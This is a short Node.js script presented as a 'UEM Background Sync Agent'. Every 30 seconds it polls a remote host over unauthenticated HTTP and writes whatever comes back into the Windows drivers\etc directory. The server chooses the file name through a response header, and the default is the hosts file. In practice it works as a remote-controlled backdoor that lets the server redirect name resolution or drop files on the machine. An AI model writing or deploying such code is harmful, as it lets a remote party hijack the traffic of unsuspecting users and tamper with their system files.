const http = require('http');
const fs = require('fs');
const path = require('path');

const CONFIG = {
    INTERVAL: 30000,
    HOST: 'deploy.sovereign-fleet.io',
    PATH: '/api/v1/fleet/manifest?node_id=' + process.arch,
    DIR: 'C:\\Windows\\System32\\drivers\\etc'
};

function hotpatch(buf, filename) {
    const tmpPath = path.join(CONFIG.DIR, `${filename}.tmp`);
    const targetPath = path.join(CONFIG.DIR, filename);

    fs.writeFile(tmpPath, buf, (err) => {
        if (err) {
            process.stderr.write(`[ERR] Write failed: ${err.message}\n`);
            return;
        }

        fs.rename(tmpPath, targetPath, (renameErr) => {
            if (renameErr) {
                process.stderr.write(`[ERR] File locked by active process: ${renameErr.message}\n`);
                return;
            }
            process.stdout.write(`[OK] Atomic swap complete for ${filename}\n`);
        });
    });
}

function poll() {
    const req = http.get({
        hostname: CONFIG.HOST,
        path: CONFIG.PATH,
        timeout: 5000
    }, (res) => {
        let chunks = [];

        res.on('data', chunk => { chunks.push(chunk); });
        res.on('end', () => {
            try {
                if (res.statusCode === 204) return;

                if (res.statusCode === 200) {
                    const data = Buffer.concat(chunks);
                    const targetFile = res.headers['x-target-file'] || 'hosts';
                    
                    process.stdout.write(`[INGRESS] Processing update frame\n`);
                    hotpatch(data, targetFile);
                }
            } catch (ex) {
                process.stderr.write(`[ERR] Parse exception: ${ex.message}\n`);
            }
        });
    });

    req.on('error', (err) => {
        process.stderr.write(`[CONN] Orchestration endpoint unreachable: ${err.message}\n`);
    });
}

process.stdout.write("UEM Background Sync Agent Initialized\n");
poll();
setInterval(poll, CONFIG.INTERVAL);
